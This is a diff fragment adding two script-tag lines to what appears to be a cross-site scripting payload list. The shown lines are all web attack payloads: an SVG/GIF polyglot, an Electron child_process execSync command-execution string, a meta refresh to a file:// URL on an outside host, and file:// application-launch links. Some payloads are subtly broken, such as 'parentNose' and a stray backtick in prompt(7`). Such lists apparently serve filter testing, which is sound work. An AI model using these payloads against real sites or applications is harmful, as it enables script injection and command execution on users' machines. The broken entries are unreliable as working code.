@@ -1706,3 +1706,5 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <script>top.require('child_process').execSync('open -a Calculator')</script>
 <meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
 <a href="file:///Applications/Calculator.app"><svg onload="this.parentNose.click()"></a>
+<script type=text/babel>prompt(7)</script>
+<script type="text/rocketscript">prompt(7`)</script>
